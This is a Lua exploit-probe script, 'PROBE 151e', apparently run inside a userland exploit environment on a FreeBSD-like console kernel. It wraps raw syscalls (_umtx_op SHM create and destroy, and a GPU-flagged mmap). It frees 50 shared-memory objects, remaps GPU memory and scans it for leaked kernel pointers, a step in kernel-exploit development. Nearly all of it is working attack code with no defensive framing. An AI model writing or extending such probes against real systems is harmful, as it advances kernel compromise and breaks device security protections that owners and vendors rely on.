-- CRASH_CLASS: LOW
-- PROBE 151e: SHM create/destroy with single reused buffer

print("=== PROBE 151e: SHM REUSE BUF ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

print("pid=" .. to_num(syscall.getpid()))
print("S1")

local sc_umtx = make_syscall(454)
local sc_mmap = make_syscall(477)

-- Single reusable key buffer
local key = memory.alloc(0x20)

-- Step 1: GPU mmap baseline
local gpu1 = sc_mmap(uint64(0), uint64(4 * 0x4000), uint64(0x33),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
print(string.format("gpu1=%s", tostring(gpu1)))

print("S2")

-- Step 2: Create and destroy 50 SHM objects (reuse key buffer)
for i = 1, 50 do
    memory.write_qword(key, uint64(0xAA000000 + i))
    pcall(function() sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0)) end)
end
print("created 50")

for i = 1, 50 do
    memory.write_qword(key, uint64(0xAA000000 + i))
    pcall(function() sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0)) end)
end
print("destroyed 50")

print("S3")

-- Step 3: New GPU mmap after SHM free
local gpu2 = sc_mmap(uint64(0), uint64(4 * 0x4000), uint64(0x33),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
print(string.format("gpu2=%s", tostring(gpu2)))

print("S4")

-- Step 4: Scan GPU2 for kernel pointers
local kcount = 0
for off = 0, 4 * 0x4000 - 8, 64 do
    local ok, val = pcall(function() return memory.read_qword(gpu2 + off) end)
    if ok and val then
        local vh, vl = get_hi_lo(val)
        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF and vl ~= 0 then
            kcount = kcount + 1
            if kcount <= 10 then
                print(string.format("K +0x%X: 0x%08X%08X", off, vh, vl))
            end
        end
    end
end
print("kptr=" .. kcount)

-- Canary
print("canary=" .. to_num(syscall.getpid()))
print("=== PROBE 151e COMPLETE ===")
